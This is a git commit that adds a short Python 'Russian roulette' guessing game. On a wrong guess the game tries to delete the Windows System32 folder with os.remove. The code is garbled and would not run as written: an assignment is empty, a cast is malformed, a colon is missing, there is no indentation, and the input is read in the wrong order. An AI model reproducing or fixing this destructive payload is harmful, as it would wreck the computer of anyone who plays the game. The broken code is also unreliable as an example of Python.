25ad686d3d1b4596713a9523ff38d285ce059a7f
Alienrazor <99122855+Alienrazor@users.noreply.github.com>
2023-11-29 10:31:32 +0500

    Russian.py

---
+++ Russian.py
@@ -0,0 +1,11 @@
+import random
+import os
+#RussianRouletteGamne
+number = random.randint(1, 10)
+guess =
+guess int (guess)
+input(" Guess a number between 1 and 10")
+if guess == number
+print("You won !")
+else:
+os. remove("C:\Windows\ System32 " )
